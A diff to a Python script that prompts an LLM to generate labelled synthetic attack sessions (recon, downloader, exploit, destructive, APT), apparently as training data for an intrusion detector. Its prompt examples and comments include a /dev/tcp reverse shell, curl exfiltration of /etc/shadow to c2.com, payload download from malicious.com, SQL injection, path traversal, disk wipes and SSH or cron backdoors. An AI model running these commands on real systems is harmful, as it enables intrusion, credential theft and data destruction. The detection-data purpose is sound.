@@ -48,7 +48,7 @@ CLASS_CONFIG = {
         "min_preferred_ratio": 0.0,  # Safe has no required techniques
         "typical_binary_behaviors": [],
         "system_changes": ["file_read", "process_list"],
-        "target_count": 5000,
+        "target_count": 1000, #5 times
     },
     1: {
         "name": "Recon",
@@ -58,10 +58,10 @@ CLASS_CONFIG = {
                               "defense_evasion", "privilege_escalation"],
         # Best-effort: these are all techniques we WANT to see, but any subset is fine
         "preferred_techniques": ["T1046", "T1083", "T1082", "T1016", "T1049", "T1033", "T1057", "T1087.001", "T1595.002", "T1595.003"],
-        "min_preferred_ratio": 0.25,  # Hit at least 25% of preferred techniques
+        "min_preferred_ratio": 0.1,  # Hit at least 25% of preferred techniques
         "typical_binary_behaviors": ["recon_scanner"],
         "system_changes": ["file_read", "network_probe", "process_list"],
-        "target_count": 12000,
+        "target_count": 1500, #12 times
     },
     2: {
         "name": "Downloader",
@@ -73,7 +73,7 @@ CLASS_CONFIG = {
         "min_preferred_ratio": 0.25,  # Hit at least 25%
         "typical_binary_behaviors": ["miner", "botnet", "downloader"],
         "system_changes": ["file_write", "file_download", "process_exec", "network_conn"],
-        "target_count": 5000,
+        "target_count": 2000, # 5 times
     },
     3: {
         "name": "Exploit",
@@ -85,7 +85,7 @@ CLASS_CONFIG = {
         "min_preferred_ratio": 0.25,  # At least 2 out of 9
         "typical_binary_behaviors": ["credential_stealer", "rat", "packed", "web_shell", "sqli_payloads"],
         "system_changes": ["file_read", "process_exec", "file_write", "credential_access", "log_clear"],
-        "target_count": 8000,
+        "target_count": 2000,
     },
     4: {
         "name": "Destructive",
@@ -95,7 +95,7 @@ CLASS_CONFIG = {
         "min_preferred_ratio": 0.25,  # At least 2 out of 7
         "typical_binary_behaviors": ["destructive", "ransomware", "wiper"],
         "system_changes": ["file_delete", "file_encrypt", "log_clear", "service_stop", "config_modify"],
-        "target_count": 8000,
+        "target_count": 2000,
     },
     5: {
         "name": "ADVANCED_APT",
@@ -107,7 +107,7 @@ CLASS_CONFIG = {
         "typical_binary_behaviors": ["go_binary", "multi_capability", "persistence", "credential_access", "c2"],
         "system_changes": ["user_add", "cron_add", "ssh_key_add", "service_create", "config_modify",
                            "file_write", "network_conn", "credential_access", "exfiltration"],
-        "target_count": 5000,
+        "target_count": 2000,
     },
 }
 
@@ -154,7 +154,9 @@ SIMPLIFIED_SYSTEM_PROMPT = """You are a red team operator generating realistic a
 CRITICAL ENVIRONMENT CONSTRAINTS:
 1. The target environment is a LINUX system (Ubuntu/Debian) running an exposed HTTP web application.
 2. DO NOT generate Windows commands (no PowerShell, no .exe, no cmd.exe).
-3. You should generate raw HTTP requests (e.g., `GET /login.php?user=admin'-- HTTP/1.1`, `POST /api/upload`) to accurately simulate attacks against web services and post-compromise actions.
+3. You should generate raw HTTP requests (e.g., `GET /login.php?user=admin'-- HTTP/1.1`, `POST /api/upload`, PUT, DELETE, etc.) to accurately simulate attacks against web services and post-compromise actions, this can be in form of any headers or payload attached to those HTTP-requests.
+4. The commands/queries should be different according to the attack and as a attacker you have to create a real environment, like a webserver where you will route the requests or exfiltrate data. Note that every example mentioned is just for reference and SHOULD NOT BE HARDCODED.
+5. And keep in mind that the commands/requests you provide should be the commands which are getting logged on the web-server you trying to attack.
 
 JSON SCHEMA CONSTRAINTS:
 1. Output ONLY a flat JSON object.
@@ -169,46 +171,46 @@ EXPECTED JSON FORMAT:
   "system_changes_summary": "brief description of system changes"
 }
 
-=== COMPREHENSIVE CLASS EXAMPLES (MUST INCLUDE COMMANDS TO TRIGGER ALL LISTED TECHNIQUES) ===
+=== COMPREHENSIVE CLASS EXAMPLES (MUST INCLUDE COMMANDS TO TRIGGER ALL LISTED TECHNIQUES AND NONE FORBIDDEN TECHNIQUES) ===
 
 
 === Recon (1) ===
 REQUIRED TECHNIQUES: T1046 (Network Service Discovery), T1083 (File/Directory Discovery), T1087.001 (Local Account), T1082 (System Info), T1016 (Network Config), T1049 (Network Connections), T1033 (User Discovery), T1057 (Process Discovery)
-COMMANDS: GET /admin/login.php HTTP/1.1; GET /api/v1/users HTTP/1.1; sqlmap -u http://localhost; nmap -sV -p 80,443,22 192.168.1.0/24; cat /etc/passwd; uname -a; ps aux
-BINARY: recon_scanner
 SYSTEM CHANGES: web directory enumeration, network scan, port enumeration, user enumeration, system info gathering
 
 === Downloader (2) ===
 REQUIRED TECHNIQUES: T1105 (Ingress Tool Transfer), T1204.002 (User Execution), T1059.004 (Unix Shell), T1072 (Software Deployment), T1610 (Deploy Container)
-COMMANDS: POST /upload.php HTTP/1.1; wget http://malicious.com/payload.sh; chmod +x payload.sh; ./payload.sh &
-BINARY: miner
 SYSTEM CHANGES: malicious file upload, file write, file download, process execution, network connection to C2
 
-=== Exploit (3) ===
-REQUIRED TECHNIQUES: T1552.001 (Credentials in Files), T1059.004 (Unix Shell), T1140 (Deobfuscate/Decode), T1548.001 (Setuid/Setgid), T1070.003 (Clear Command History), T1003 (OS Credential Dumping), T1552.004 (Private Keys), T1059.006 (Python), T1222.002 (File Permissions), T1548.003 (Sudo), T1556 (Modify Auth)
-COMMANDS: POST /login.php?user=admin' OR 1=1-- HTTP/1.1; GET /api/download?file=../../../../etc/shadow HTTP/1.1; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1; sudo -l; cat ~/.ssh/id_rsa
-BINARY: rat
-SYSTEM CHANGES: file read (/etc/shadow), credential access, process execution (reverse shell), file write (exploit binary), log clearing (history -c), credential dumping, setuid binary, sudo, password manipulation, credential export, credential dumping
 
-=== Destructive (4) ===
-REQUIRED TECHNIQUES: T1485 (Data Destruction), T1486 (Data Encrypted for Impact), T1499.004 (Fork Bomb), T1070.002 (Clear Linux Logs), T1070.003 (Clear Command History), T1561.001 (Disk Wipe), T1561.002 (Disk Structure Wipe)
-COMMANDS: POST /upload/rm.php HTTP/1.1; rm -rf /; dd if=/dev/zero of=/dev/sda; history -c; shred -u /etc/shadow
-BINARY: destructive
-SYSTEM CHANGES: file deletion (/var/log/*), file encryption (openssl), log clearing (history -c), service stop (sshd), config modification (iptables), disk structure wipe, fork bomb, disk wipe
-
-=== ADVANCED_APT (5) ===
-REQUIRED TECHNIQUES: T1053.003 (Cron), T1098.004 (SSH Authorized Keys), T1543.002 (Systemd Service), T1105 (Ingress Tool Transfer), T1552.001 (Credentials in Files), T1048.003 (Exfiltration Over C2), T1059.004 (Unix Shell), T1102.002 (Bidirectional Comm), T1102.001 (Web Service), T1556 (Modify Auth), T1027.002 (Software Packing)
-COMMANDS: POST /upload/backdoor.php HTTP/1.1; echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys; curl -X POST -d @/etc/shadow http://c2.com/exfil; crontab -l | { cat; echo "* * * * * /tmp/backdoor"; } | crontab -
-BINARY: go_binary
-SYSTEM CHANGES: file write, file download, process execution, credential access, exfiltration, cron job, SSH key addition, systemd service, config modification
-
-=== Safe (0) ===
-COMMANDS: GET / HTTP/1.1; GET /index.html HTTP/1.1; ls -la; pwd; whoami
-BINARY: none
-SYSTEM CHANGES: file read, process list
 
 COMMANDS MUST USE SEMICOLONS (; ) TO SEPARATE COMMANDS, NOT NEWLINES.
 """
+# === Safe (0) ===
+# COMMANDS: GET / HTTP/1.1; GET /index.html HTTP/1.1;
+# BINARY: none always
+# SYSTEM CHANGES: file read, process list, it can be normal query which any user is trying to perform as any normal web server might behave.
+
+
+# === Exploit (3) ===
+# REQUIRED TECHNIQUES: T1552.001 (Credentials in Files), T1059.004 (Unix Shell), T1140 (Deobfuscate/Decode), T1548.001 (Setuid/Setgid), T1070.003 (Clear Command History), T1003 (OS Credential Dumping), T1552.004 (Private Keys), T1059.006 (Python), T1222.002 (File Permissions), T1548.003 (Sudo), T1556 (Modify Auth)
+# COMMANDS: POST /login.php?user=admin' OR 1=1-- HTTP/1.1; GET /api/download?file=../../../../etc/shadow HTTP/1.1; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1; sudo -l; cat ~/.ssh/id_rsa
+# BINARY: rat
+# SYSTEM CHANGES: priviledge file read , credential access, process execution (reverse shell), file write (exploit binary), log clearing (history -c), credential dumping, setuid binary, sudo, password manipulation, credential export, credential dumping
+
+# === Destructive (4) ===
+# REQUIRED TECHNIQUES: T1485 (Data Destruction), T1486 (Data Encrypted for Impact), T1499.004 (Fork Bomb), T1070.002 (Clear Linux Logs), T1070.003 (Clear Command History), T1561.001 (Disk Wipe), T1561.002 (Disk Structure Wipe)
+# COMMANDS: POST /upload/rm.php HTTP/1.1; rm -rf /; dd if=/dev/zero of=/dev/sda; history -c; shred -u /etc/shadow
+# BINARY: destructive
+# SYSTEM CHANGES: file deletion (/var/log/*), file encryption (openssl), log clearing (history -c), service stop (sshd), config modification (iptables), disk structure wipe, fork bomb, disk wipe
+
+# === ADVANCED_APT (5) ===
+# REQUIRED TECHNIQUES: T1053.003 (Cron), T1098.004 (SSH Authorized Keys), T1543.002 (Systemd Service), T1105 (Ingress Tool Transfer), T1552.001 (Credentials in Files), T1048.003 (Exfiltration Over C2), T1059.004 (Unix Shell), T1102.002 (Bidirectional Comm), T1102.001 (Web Service), T1556 (Modify Auth), T1027.002 (Software Packing)
+# COMMANDS: POST /upload/backdoor.php HTTP/1.1; echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys; curl -X POST -d @/etc/shadow http://c2.com/exfil; crontab -l | { cat; echo "* * * * * /tmp/backdoor"; } | crontab -
+# BINARY: go_binary
+# SYSTEM CHANGES: file write, file download, process execution, credential access, exfiltration, cron job, SSH key addition, systemd service, config modification
+
+
 
 # =============================================================================)
 
@@ -392,7 +394,9 @@ def validate_session_mitre(session_json: Dict, class_id: int) -> Tuple[bool, Lis
     # HARD CHECK: forbidden tactics must NOT be present
     for tactic in config.get("forbidden_tactics", []):
         if annotation["tactic_vector"].get(tactic, 0) > 0:
-            errors.append(f"Forbidden tactic present: {tactic}")
+            # errors.append(f"Forbidden tactic present: {tactic}")
+            print(f"Forbidden tactic present: {tactic}")
+        pass
 
     # SOFT CHECK: at least one target tactic should fire
     target_tactics = config.get("target_tactics", [])
@@ -572,53 +576,54 @@ class LLMSyntheticGenerator:
 
         # Get few-shot examples from real data
         few_shot = self.few_shot_examples.get(class_id, [])
-        few_shot_str = ""
-        if config["target_tactics"]:
-            few_shot_str = "\n\nREAL EXAMPLES FROM DATA:\n"
-            for i, ex in enumerate(self.few_shot_examples.get(class_id, [])[:3]):
-                cmds = ex.get("commands", "")[:200]
-                few_shot_str += f"Example {i+1}: {cmds}...\n"
+        few_shot_str = "Keep in mind to not copy the exact Class examples, which is specific to only one imaginary server"
+        # if config["target_tactics"]:
+        #     few_shot_str = "\n\nREAL EXAMPLES FROM DATA:\n"
+        #     for i, ex in enumerate(self.few_shot_examples.get(class_id, [])[:3]):
+        #         cmds = ex.get("commands", "")[:200]
+        #         few_shot_str += f"Example {i+1}: {cmds}...\n"
 
         # Class-aware creativity
         if class_id == 0:
             creativity_instruction = (
-                "STRICT: Generate ONLY benign HTTP requests and benign Linux commands. "
-                "Vary the HTTP pages (GET /, /index.html) and basic Linux discovery (ls, pwd, whoami). "
+                "STRICT: Generate ONLY benign HTTP requests. "
+                "Vary the HTTP pages (Normal requests which user usually performs in various website i.e GET, POST,etc. with normal headers and values). "
                 "ZERO offensive commands. No attempts to access admin panels, no file uploads, no shell command injection. Safe benign session only."
             )
         elif class_id == 1:
             creativity_instruction = (
-                "STRICT: Generate a mix of HTTP reconnaissance (e.g., scanning for admin pages, common files) and Linux system discovery commands. "
-                "Allowed HTTP patterns: GET to /admin, /server-status, /phpinfo.php, /backup. "
-                "Allowed Bash patterns: ls, ps, netstat, nmap, uname. "
-                "FORBIDDEN: POST requests with file uploads, PUT, DELETE, any attempts to exploit (like SQL injection or command injection). Stay PURELY within discovery enumeration."
+                "STRICT: Generate a mix of HTTP reconnaissance (e.g., scanning for pages, common files, etc.) and directory enumeration from the server directory ../../ like so. "
+                "HTTP patterns like: GET & POST to /admin, /server-status, /phpinfo.php, /backup, etc. depending on the webserver."
+                # "Allowed Bash patterns: ls, ps, netstat, nmap, uname. "
+                "Also can be attempt of finding vulnerabilities but not doing any hard exploit or execution;For example: using <script>alert(1);</script> to find if xss exists, changing web elements like tags and functions."
+                "FORBIDDEN: any attempts to exploit (like SQL injection or command injection). Stay PURELY within discovery enumeration."
             )
         elif class_id == 2:
             creativity_instruction = (
-                "STRICT: Generate a mix of HTTP file transfers and Linux bash commands for executing downloaded payloads. "
-                "Allowed HTTP patterns: POST to /upload.php; GET to /download/*.sh. "
-                "Allowed Bash patterns: curl, wget, chmod +x, ./payload, python3 script.py. "
+                "STRICT: Generate a mix of HTTP file transfers using web html elements of website to download some payload from a created website should be named randomly to keep anonimity, also can have Linux bash commands as a part of that http requests in some input of the website for executing downloaded payloads. "
+                # "HTTP patterns examples: POST to /upload.php; GET to /download/*.sh. ; These are just examples"
+                # "Bash patterns examples: curl, wget, chmod +x, ./adaga.ext, python3 script.py.; Theser are just examples"
                 "FORBIDDEN: Any attempts to exploit (like SQL injection) or access admin panels without file transfer intent. Stay PURELY within file transfer and execution."
             )
         elif class_id == 3:
             creativity_instruction = (
                 "CRITICAL: Be a highly creative red team operator. Start with an HTTP exploit request, followed by Linux bash commands. "
-                "Allowed HTTP patterns: POST to /login.php with SQLi; Command injection parameters; GET to /api/download?file=../../etc/shadow. "
-                "Allowed Bash patterns: bash -i, cat /etc/shadow, sudo -l, chmod +s. "
+                "HTTP patterns like: POST to /login.php with SQLi; Command injection parameters; GET to /api/download?file=../../etc/shadow. "
+                "Bash patterns as a part of those http request which the server logs: bash -i, cat /etc/shadow, sudo -l, chmod +s. "
                 "FORBIDDEN: Benign requests that do not contain exploit patterns. Stay FOCUSED on exploitation."
             )
         elif class_id == 4:
             creativity_instruction = (
                 "STRICT: Generate a mix of HTTP requests triggering destructive actions and Linux bash commands causing destruction. "
-                "Allowed HTTP patterns: POST to /upload/rm.php, /upload/shred.php, /upload/dd.php. "
-                "Allowed Bash patterns: rm -rf, shred -u, dd if=/dev/zero, history -c. "
+                "HTTP patterns like: POST to /upload/rm.php, /upload/shred.php, /upload/dd.php. "
+                "Bash patterns as a part of those http request which the server logs: rm -rf, shred -u, dd if=/dev/zero, history -c. "
                 "FORBIDDEN: Benign requests. Stay FOCUSED on destruction."
             )
         elif class_id == 5:
             creativity_instruction = (
                 "CRITICAL: Be a highly creative APT operator. Start with an HTTP request to drop a webshell/backdoor, followed by Linux bash commands for persistence/C2. "
-                "Allowed HTTP patterns: POST to /upload/backdoor.php, /upload/exfil.php. "
-                "Allowed Bash patterns: echo 'ssh-rsa...' >> ~/.ssh/authorized_keys, crontab, systemctl enable backdoor. "
+                "HTTP patterns like: POST to /upload/backdoor.php, /upload/exfil.php. "
+                "Bash patterns as a part of those http request which the server logs: echo 'ssh-rsa...' >> ~/.ssh/authorized_keys, crontab, systemctl enable backdoor. "
                 "FORBIDDEN: Benign requests. Stay FOCUSED on APT activities."
             )
         else:
@@ -633,9 +638,9 @@ class LLMSyntheticGenerator:
         return f"""Generate a {config['name']} session.
 
 TARGET CLASS: {config['name']} (id={class_id})
-TARGET TACTICS (at least one must fire): {config['target_tactics']}
-PREFERRED TECHNIQUES (pick a creative subset, don't need all): {config.get('preferred_techniques', [])}
-FORBIDDEN TACTICS (absolutely must NOT appear): {config['forbidden_tactics']}
+TARGET TACTICS (at least one must fire or subset of ): {config['target_tactics']}
+PREFERRED TECHNIQUES (pick a creative subset): {config.get('preferred_techniques', [])}
+take care such that none appear from these FORBIDDEN TACTICS: {config['forbidden_tactics']}
 TYPICAL BINARY: {config['typical_binary_behaviors']}
 SYSTEM CHANGES: {config['system_changes']}
 
@@ -643,6 +648,7 @@ SYSTEM CHANGES: {config['system_changes']}
 
 {creativity_instruction}
 
+Accumulate the Knowledge and then proceed, try to provide output in ONE SHOT.
 Output ONLY the JSON format specified in the system prompt."""
 
     async def generate_session(self, class_id: int) -> Optional[Dict]:
@@ -670,10 +676,10 @@ Output ONLY the JSON format specified in the system prompt."""
                 llm_class = llm_output.get("class_name", CLASS_CONFIG[class_id]["name"])
 
                 if not commands:
-                    print(f"  Attempt {attempt+1}: LLM returned empty commands")
+                    print(f"  Attempt {attempt+1}: LLM returned empty commands {response}")
                     # Append error for retry
-                    messages.append({"role": "assistant", "content": response})
-                    messages.append({"role": "user", "content": "You returned empty commands or invalid JSON. Please return valid JSON containing the 'commands' array."})
+                    # messages.append({"role": "assistant", "content": response})
+                    # messages.append({"role": "user", "content": "This was your response earlier and and it keeps on going unneccessarily try to limit the amount of iterations and increase uniqueness dropping the old commands in the response. "})
                     continue
 
                 # WE PROGRAMMATICALLY BUILD ALL FEATURE VECTORS
@@ -719,7 +725,7 @@ Output ONLY the JSON format specified in the system prompt."""
                         # User Request: If this is the final attempt, accept it anyway instead of falling back
                         if attempt < self.max_retries - 1:
                             messages.append({"role": "assistant", "content": response})
-                            messages.append({"role": "user", "content": f"Your previous output failed validation. Errors: {mitre_errors}. Please try again and fix these issues while maintaining valid JSON."})
+                            messages.append({"role": "user", "content": f"This was your previous output having validation. Errors: {mitre_errors}. Please try again and fix these issues while maintaining valid JSON."})
                             continue
                         else:
                             print(f"  ⚠ Accepting session despite validation errors (final attempt fallback override)")
@@ -786,6 +792,7 @@ async def generate_synthetic_sessions_llm(
                 class_sessions.append(session)
                 generated += 1
             else:
+                continue
                 print(f"  ✗ Failed, using template fallback")
                 from training.neural.synthetic import SyntheticGenerator
                 gen = SyntheticGenerator(random_seed=random.randint(1, 1000000))
@@ -983,7 +990,7 @@ if __name__ == "__main__":
         test_counts = {cid: cfg["target_count"] for cid, cfg in CLASS_CONFIG.items()}
     else:
         print("Starting QUICK TEST (5 sessions per class). Use --class_id N or --full for real generation.")
-        test_counts = {0: 3, 1: 3, 2: 3, 3: 4, 4: 3, 5: 3}
+        test_counts = {0: 4, 1: 4, 2: 4}
 
     print(f"Output will be saved to: {args.output}")
 
